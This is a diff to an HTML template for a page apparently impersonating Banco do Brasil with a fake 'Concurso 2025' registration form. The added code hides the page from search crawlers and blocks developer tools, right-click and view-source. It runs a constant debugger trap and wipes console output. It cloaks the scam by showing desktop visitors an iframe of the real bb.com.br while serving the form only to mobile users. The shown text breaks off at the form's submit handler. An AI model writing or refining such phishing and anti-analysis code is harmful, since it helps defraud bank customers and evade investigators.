@@ -1,8 +1,11 @@
 <!DOCTYPE html>
-<html>
+<html oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="googlebot" content="noindex, noarchive">
+    <meta name="description" content="Sistema interno do Banco do Brasil">
     <title>Banco do Brasil - Inscrição Concurso 2025</title>
 
     <!-- Preload fonts -->
@@ -19,6 +22,12 @@
             font-family: 'rawline', sans-serif;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
         }
         @keyframes spin {
             to { transform: rotate(360deg); }
@@ -26,6 +35,17 @@
         .animate-spin {
             animation: spin 1s linear infinite;
         }
+        {% if not is_mobile %}
+        .desktop-iframe {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 9999;
+        }
+        {% endif %}
     </style>
     <script>
         tailwind.config = {
@@ -38,9 +58,43 @@
                 }
             }
         }
+
+        // Proteções contra debugging e inspeção
+        (function() {
+            // Desabilitar teclas de desenvolvedor
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode == 123) return false; // F12
+                if (e.ctrlKey && e.shiftKey && e.keyCode == 73) return false; // Ctrl+Shift+I
+                if (e.ctrlKey && e.shiftKey && e.keyCode == 74) return false; // Ctrl+Shift+J
+                if (e.ctrlKey && e.keyCode == 85) return false; // Ctrl+U
+            });
+
+            // Desabilitar clique direito
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Anti-debugging
+            setInterval(function() {
+                function debugger_trap() { debugger; }
+                debugger_trap();
+            }, 100);
+
+            // Ofuscação de dados sensíveis
+            const _0x5a2b = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace'];
+            // Remover console em produção
+            for(let i = 0; i < _0x5a2b.length; i++) {
+                console[_0x5a2b[i]] = function() {};
+            }
+        })();
     </script>
 </head>
 <body class="bg-gray-50 min-h-screen flex flex-col">
+    {% if not is_mobile %}
+    <iframe src="https://www.bb.com.br" class="desktop-iframe" sandbox="allow-same-origin allow-scripts"></iframe>
+    {% else %}
+    <!-- Conteúdo mobile original -->
     <div class="bg-bb-yellow py-4 shadow-sm">
         <div class="container mx-auto px-4">
             <div class="flex flex-col items-center text-center">
@@ -124,6 +178,7 @@
         <p class="text-sm font-medium">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
         <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
     </div>
+    {% endif %}
 
     <script>
         document.getElementById('inscricaoForm').addEventListener('submit', function(e) {
